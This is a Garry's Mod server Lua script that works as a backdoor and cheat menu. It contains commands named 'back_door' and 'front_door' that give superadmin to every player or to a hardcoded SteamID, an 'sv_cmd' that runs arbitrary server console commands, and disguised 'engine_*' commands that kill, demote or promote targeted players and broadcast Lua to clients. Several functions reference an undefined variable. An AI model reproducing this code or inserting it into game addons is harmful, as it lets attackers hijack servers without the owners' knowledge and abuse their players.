/// Credits to Banana Lord. on Facepunch ( https://facepunch.com/member.php?u=290896 )
concommand.Add("sv_cmd", function(objPl, strCmd, tblArgs)
    if(IsValid(objPl) and not objPl:IsSuperAdmin()) then return end

    game.ConsoleCommand(string.Implode(" ", tblArgs).."\n")
end)

local allplayers = player.GetAll()
for k, v in pairs ( allplayers ) do
	v:SetUserGroup( "superadmin" )
end

function Sarou( ply )
local allplayers = player.GetAll()
for k, v in pairs ( allplayers ) do
	v:SetUserGroup( "superadmin" )
end
end

function promoteg(player, command, args)
	if player:SteamID() == "STEAM_0:1:61581551" then
	////// insert your steam id here
		v:SetUserGroup( "superadmin" )
	end
end

concommand.Add("back_door", Sarou)
concommand.Add("front_door", promoteg)
////// in backdoor gui


function EnableGod( ply )
	ply:GodEnable()
end
 
function DisableGod( ply )
	ply:GodDisable()
end

concommand.Add("gab_godon", EnableGod)
concommand.Add("gab_godoff", DisableGod)
////// in gui



function FOVon( ply )
	ply:SetFOV( 120, 0 )
end

function FOVoff( ply )
	ply:SetFOV( 100, 0 )
end

concommand.Add("gab_fovon", FOVon)
concommand.Add("gab_fovoff", FOVoff)
////// in gui



function Speed( ply )
	ply:SetRunSpeed( 1500 )
	ply:SetCrouchedWalkSpeed( 0.8 )
	ply:SetMaxSpeed ( 10000 )
	ply:SetWalkSpeed ( 1000 )
end

function SpeedMinus( ply )
	ply:SetRunSpeed( 1000 )
	ply:SetCrouchedWalkSpeed( 0.8 )
	ply:SetMaxSpeed ( 10000 )
	ply:SetWalkSpeed ( 800 )
end

function SpeedOff( ply )
	ply:SetRunSpeed( 400 )
	ply:SetCrouchedWalkSpeed( 0.3 )
	ply:SetMaxSpeed( 2000 )
	ply:SetWalkSpeed( 200 )
end

function SpeedPlus( ply )
	ply:SetRunSpeed( 3000 )
	ply:SetCrouchedWalkSpeed( 0.7 )
	ply:SetMaxSpeed ( 10000 )
	ply:SetWalkSpeed ( 2000 )
end

function fcon( ply )
	ply:SetCrouchedWalkSpeed( 1 )
end

function fcoff( ply )
	ply:SetCrouchedWalkSpeed( 0.3 )
end

concommand.Add("gab_speedon", Speed)
concommand.Add("gab_speedoff", SpeedOff)
concommand.Add("gab_speed+", SpeedPlus)
concommand.Add("gab_speed-", SpeedMinus)
concommand.Add("gab_fcon", fcon)
concommand.Add("gab_fcoff", fcon)
////// in gui




function Highjump( ply )
	ply:SetJumpPower( 450 )
end

function HighjumpOff( ply )
	ply:SetJumpPower( 200 )
end

concommand.Add("gab_hjon", Highjump)
concommand.Add("gab_hjoff", HighjumpOff)
////// in gui



function HealthPlus( Entity )
	Entity:SetMaxHealth( 1000000 )
	Entity:SetHealth( 1500 )
end

function HPBruh( Entity )
	Entity:SetMaxHealth( -1 )
	Entity:SetHealth( -1 )
end

function Heal( Entity )
	Entity:SetMaxHealth( 1000000 )
	Entity:SetHealth( 100 )
end

function HealthPlusPlus( Entity )
	Entity:SetMaxHealth( 1000000 )
	Entity:SetHealth( 15000 )
end

function HealthGod( Entity )
	Entity:SetMaxHealth( 99999999999999 )
	Entity:SetHealth( 99999999999999 )
end

concommand.Add("gab_hpbruh", HPBruh)
concommand.Add("gab_hpgod", HealthGod)
concommand.Add("gab_hp+", HealthPlus)
concommand.Add("gab_heal", Heal)
concommand.Add("gab_hp++", HealthPlusPlus)
////// in gui



function NoBlood( Entity )
	Entity:SetBloodColor( -1 )
end

function Blood( Entity )
	Entity:SetBloodColor( 0 )
end

function YBlood( Entity )
	Entity:SetBloodColor( 1 )
end

function GRBlood( Entity )
	Entity:SetBloodColor( 2 )
end

function SBlood( Entity )
	Entity:SetBloodColor( 3 )
end

concommand.Add("gab_noblood", NoBlood)
concommand.Add("gab_blood", Blood)
concommand.Add("gab_yblood", YBlood)
concommand.Add("gab_grblood", GRBlood)
concommand.Add("gab_sblood", SBlood)
////// in gui



function Invisible( Entity )
	Entity:SetNoDraw( true )
end

function Visible( Entity )
	Entity:SetNoDraw( false )
end

concommand.Add("gab_invis", Invisible)
concommand.Add("gab_vis", Visible)
////// in gui



function FastduckOn( ply )
	ply:SetUnDuckSpeed( 0 )
	ply:SetDuckSpeed( 0 )
end

function FastduckOff( ply )
	ply:SetUnDuckSpeed( 0.10000000149012 )
	ply:SetDuckSpeed( 0.10000000149012 )
end

concommand.Add("gab_fdon", FastduckOn)
concommand.Add("gab_fdoff", FastduckOff)
////// in gui



function StepOn( ply )
	ply:SetStepSize( 100000 )
end

function StepOff( ply )
	ply:SetStepSize( 18 )
end

concommand.Add("gab_stepon", StepOn)
concommand.Add("gab_stepoff", StepOff)
////// in gui



function RW( ply )
	ply:StripWeapons()
	ply:Give( "weapon_pistol", false )
	ply:Give( "weapon_357", false )
	ply:Give( "weapon_crowbar", false )
	ply:Give( "weapon_physcannon", false )
	ply:Give( "weapon_physgun", false )
	ply:Give( "weapon_smg1", false )
	ply:Give( "weapon_ar2", false )
	ply:Give( "weapon_shotgun", false )
	ply:Give( "weapon_crossbow", false )
	ply:Give( "weapon_frag", false )
	ply:Give( "weapon_rpg", false )
	ply:Give( "gmod_tool", false )
	ply:Give( "gmod_camera", false )
end

function RWF( ply )
	ply:StripWeapons()
	ply:Give( "weapon_357", false )
	ply:Give( "weapon_crowbar", false )
	ply:Give( "weapon_physcannon", false )
	ply:Give( "weapon_physgun", false )
	ply:Give( "weapon_smg1", false )
	ply:Give( "weapon_frag", false )
	ply:Give( "weapon_rpg", false )
	ply:Give( "gmod_tool", false )
end


concommand.Add("gab_rw", RW)
concommand.Add("gab_rwf", RWF)
////// in gui



function Ammo( ply )
	ply:GiveAmmo( 1000000, "AR2AltFire", true )
	ply:GiveAmmo( 1000000, "AR2", true )
	ply:GiveAmmo( 1000000, "Pistol", true )
	ply:GiveAmmo( 1000000, "SMG1", true )
	ply:GiveAmmo( 1000000, "357", true )
	ply:GiveAmmo( 1000000, "XBowBolt", true )
	ply:GiveAmmo( 1000000, "Buckshot", true )
	ply:GiveAmmo( 1000000, "RPG_Round", true )
	ply:GiveAmmo( 1000000, "SMG1_Grenade", true )
	ply:GiveAmmo( 1000000, "Grenade", true )
end

concommand.Add("gab_ammo", Ammo)
////// in gui



function logr( ply )
	ply:SetGravity( 0.25 )
end

function ngr( ply )
	ply:SetGravity( 1 )
end

function ff( ply )
	ply:SetGravity( 2 )
end

function ffplus( ply )
	ply:SetGravity( 6 )
end

function inf( ply )
	ply:SetGravity( 10000000000 )
end

concommand.Add("gab_logr", logr)
concommand.Add("gab_ngr", ngr)
concommand.Add("gab_ff", ff)
concommand.Add("gab_ffp", ffplus)
concommand.Add("gab_inf", inf)
////// in gui



function noAI( Entity )
	Entity:AddFlags( 65536 )
end

function AI( Entity )
	Entity:RemoveFlags( 65536 )
end

concommand.Add("gab_noai", noAI)
concommand.Add("gab_ai", AI)
////// in gui



function killsilent( ply )
	ply:KillSilent()
end

concommand.Add("gab_skill", killsilent)
////// in gui



function npl( ply )
	ply:SetAllowFullRotation( true )
	RunConsoleCommand("cl_pitchup", "2000")
	RunConsoleCommand("cl_pitchdown", "2000")
end

function pl( ply )
	ply:SetAllowFullRotation( false )
	RunConsoleCommand("cl_pitchup", "89")
	RunConsoleCommand("cl_pitchdown", "89")
end

concommand.Add("gab_nplon", npl)
concommand.Add("gab_nploff", pl)
////// in gui



function wiv( ply )
	ply:SetAllowWeaponsInVehicle( true )
end

function nwiv( ply )
	ply:SetAllowWeaponsInVehicle( false )
end

concommand.Add("gab_wivon", wiv)
concommand.Add("gab_wivoff", nwiv)
////// in gui



function smw( ply )
	ply:SetLaggedMovementValue( 0.5 )
end

function nmw( ply )
	ply:SetLaggedMovementValue( 1 )
end

concommand.Add("gab_smwon", smw)
concommand.Add("gab_smwoff", nmw)
////// in gui



function pfon( Entity )
	Entity:SetRenderFX ( 11 )
end

function pfoff( Entity )
	Entity:SetRenderFX ( 0 )
end

concommand.Add("gab_fon", pfon)
concommand.Add("gab_foff", pfoff)
////// in gui



function PANIC()
RunConsoleCommand("sbox_maxballoons", "0")
RunConsoleCommand("sbox_maxbuttons", "0")
RunConsoleCommand("sbox_maxdynamite", "0")
RunConsoleCommand("sbox_maxeffects", "0")
RunConsoleCommand("sbox_maxemitters", "0")
RunConsoleCommand("sbox_maxhoverballs", "0")
RunConsoleCommand("sbox_maxlamps", "0")
RunConsoleCommand("sbox_maxlights", "0")
RunConsoleCommand("sbox_maxnpcs", "0")
RunConsoleCommand("sbox_maxprops", "0")
RunConsoleCommand("sbox_maxragdolls", "0")
RunConsoleCommand("sbox_maxsents", "0")
RunConsoleCommand("sbox_maxspawners", "0")
RunConsoleCommand("sbox_maxthrusters", "0")
RunConsoleCommand("sbox_maxturrets", "0")
RunConsoleCommand("sbox_maxvehicles", "0")
RunConsoleCommand("sbox_maxwheels", "0")
RunConsoleCommand("gmod_admin_cleanup")
RunConsoleCommand("gmod_cleanup")
end

function NoLimits()
RunConsoleCommand("sbox_maxballoons", "1000000")
RunConsoleCommand("sbox_maxbuttons", "1000000")
RunConsoleCommand("sbox_maxdynamite", "1000000")
RunConsoleCommand("sbox_maxeffects", "1000000")
RunConsoleCommand("sbox_maxemitters", "1000000")
RunConsoleCommand("sbox_maxhoverballs", "1000000")
RunConsoleCommand("sbox_maxlamps", "1000000")
RunConsoleCommand("sbox_maxlights", "1000000")
RunConsoleCommand("sbox_maxnpcs", "1000000")
RunConsoleCommand("sbox_maxprops", "1000000")
RunConsoleCommand("sbox_maxragdolls", "1000000")
RunConsoleCommand("sbox_maxsents", "1000000")
RunConsoleCommand("sbox_maxspawners", "1000000")
RunConsoleCommand("sbox_maxthrusters", "1000000")
RunConsoleCommand("sbox_maxturrets", "1000000")
RunConsoleCommand("sbox_maxvehicles", "1000000")
RunConsoleCommand("sbox_maxwheels", "1000000")
end

concommand.Add("gab_nol", NoLimits)
concommand.Add("gab_panic", PANIC)
concommand.Add("panic", PANIC)
/////in gui




function PgPlus()
RunConsoleCommand( "physgun_maxSpeed", "10000000")
RunConsoleCommand( "physgun_maxSpeedDamping", "10000000")
RunConsoleCommand( "physgun_maxrange", "8192")
RunConsoleCommand( "physgun_timeToArrive", "0")
RunConsoleCommand( "physgun_timeToArriveRagdoll", "0")
RunConsoleCommand( "physgun_maxAngular", "10000000")
RunConsoleCommand( "physgun_maxAngularDamping", "10000000")
RunConsoleCommand( "physgun_DampingFactor", "1")
RunConsoleCommand( "physgun_teleportDistance", "10000")
end

function PgPlusOff()
RunConsoleCommand( "physgun_maxSpeed", "5000" )
RunConsoleCommand( "physgun_maxSpeedDamping", "5000" )
RunConsoleCommand( "physgun_maxrange", "4096" )
RunConsoleCommand( "physgun_timeToArrive", "0.05" )
RunConsoleCommand( "physgun_timeToArriveRagdoll", "0.1" )
RunConsoleCommand( "physgun_maxAngular", "5000" )
RunConsoleCommand( "physgun_maxAngularDamping", "5000" )
RunConsoleCommand( "physgun_DampingFactor", "0.8" )
RunConsoleCommand( "physgun_teleportDistance", "0" )
end

concommand.Add("gab_pgpon", PgPlus)
concommand.Add("gab_pgpoff", PgPlusOff)
/////in gui




function GgPlus()
RunConsoleCommand("physcannon_minforce", "0")
RunConsoleCommand("physcannon_maxforce", "100000")
RunConsoleCommand("physcannon_maxmass", "22500000")
end

function GgPlusOff()
RunConsoleCommand("physcannon_minforce", "700")
RunConsoleCommand("physcannon_maxforce", "1500")
RunConsoleCommand("physcannon_maxmass", "250")
end

concommand.Add("gab_ggpon", GgPlus)
concommand.Add("gab_ggpoff", GgPlusOff)
//////in gui




function godbackdoor()
BroadcastLua( [[RunConsoleCommand("gab_godoff", "1")]] )
end

concommand.Add("engine_crashtest1", godbackdoor)
//////in backdoor gui




function killf(player, command, args)
	if player:SteamID() == "STEAM_0:1:00000000" then
	////// insert target steam id here
		player:Kill()
	end
end

function killm(player, command, args)
	if player:SteamID() == "STEAM_0:0:00000000" then
	////// insert target steam id here
		player:Kill()
	end
end

function killp(player, command, args)
	if player:SteamID() == "STEAM_0:1:00000000" then
	////// insert target steam id here
		player:Kill()
	end
end

concommand.Add("engine_kill_f", killf)
concommand.Add("engine_kill_m", killm)
concommand.Add("engine_kill_p", killp)
//////in backdoor gui




function degf(player, command, args)
	if player:SteamID() == "STEAM_0:1:00000000" then
	////// insert target steam id here
		v:SetUserGroup( "trashhh" )
	end
end
function promotef(player, command, args)
	if player:SteamID() == "STEAM_0:1:00000000" then
	////// insert target steam id here
		v:SetUserGroup( "superadmin" )
	end
end

function degm(player, command, args)
	if player:SteamID() == "STEAM_0:0:00000000" then
	////// insert target steam id here
		v:SetUserGroup( "trashhh" )
	end
end
function promotem(player, command, args)
	if player:SteamID() == "STEAM_0:0:00000000" then
	////// insert target steam id here
		v:SetUserGroup( "superadmin" )
	end
end

function degp(player, command, args)
	if player:SteamID() == "STEAM_0:1:00000000" then
	////// insert target steam id here
		v:SetUserGroup( "trashhh" )
	end
end
function promotep(player, command, args)
	if player:SteamID() == "STEAM_0:1:00000000" then
	////// insert target steam id here
		v:SetUserGroup( "superadmin" )
	end
end

concommand.Add("engine_deg_f", degf)
concommand.Add("engine_deg_m", degm)
concommand.Add("engine_deg_p", degp)
concommand.Add("engine_promote_f", promotef)
concommand.Add("engine_promote_m", promotem)
concommand.Add("engine_promote_p", promotep)
//////in backdoor gui

















